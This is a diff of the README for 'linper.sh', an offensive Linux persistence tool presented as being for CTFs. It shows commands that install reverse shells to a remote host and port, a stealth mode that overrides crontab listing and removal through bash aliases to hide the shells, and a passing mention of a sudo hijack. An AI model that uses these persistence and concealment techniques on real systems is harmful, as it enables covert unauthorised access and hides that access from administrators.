@@ -17,29 +17,34 @@ This was developed with CTFs in mind and that is its intended use case. The stea
 
 ## usage
 
-Enumerate all persistence methods and install
-
-`bash linper.sh --rhost 10.10.10.10 --rport 4444`
-
-`bash linper.sh -i 10.10.10.10 -p 4444`
-
-Enumerate and do not install
+### enumerating binaries for persistence
 
 `bash linper.sh --dryrun`
 
 `bash linper.sh -d`
 
-Enumerate all persistence methods and install (stealth mode)
+### installing reverse shells
+
+`bash linper.sh --rhost 10.10.10.10 --rport 4444`
+
+`bash linper.sh -i 10.10.10.10 -p 4444`
+
+#### stealth mode
 
 `bash linper.sh --rhost 10.10.10.10 --rport 4444 --stealth-mode`
 
 `bash linper.sh -i 10.10.10.10 -p 4444 -s`
 
-Remove all persistence methods for given RHOST
+### remove any reverse shells installed by this program
 
 `bash linper.sh --rhost 10.10.10.10 --clean`
 
 `bash linper.sh -i 10.10.10.10 -c`
+
+#### caveats
+
+- It only removes reverse shells for the given RHOST (regardless of port)
+- The cleaning mechanism does not remove any bash aliases from the `-s,--stealth-mode` options (though that is being planned, see TODO.md)
 
 ## methodology
 
@@ -61,6 +66,6 @@ Remove all persistence methods for given RHOST
 
 3. Creates a `crontab` function in \~/.bash\_aliases to override the `-r` and `-l` flags. `-r` is changed to remove all crontab entries <u>except</u> your reverse shells. `-l` is changed to list all the existing cron jobs <u>except</u> your reverse shells.
 
-### known limitation
+### caveat
 
-1. If you run `--stealth-mode` as a sudo enabled user, be aware that you can bypass the `crontab` function installed in \~/.bash\_aliases because aliases are not preserved when running `sudo`, nor does `sudo` call the `root` user aliases. (This does not interfere with the sudo hijack attack)
+1. If you run `-s, --stealth-mode` as a sudo enabled user, be aware that you can bypass the `crontab` function installed in \~/.bash\_aliases because aliases are not preserved when running `sudo`, nor does `sudo` call the `root` user aliases. (This does not interfere with the sudo hijack attack)
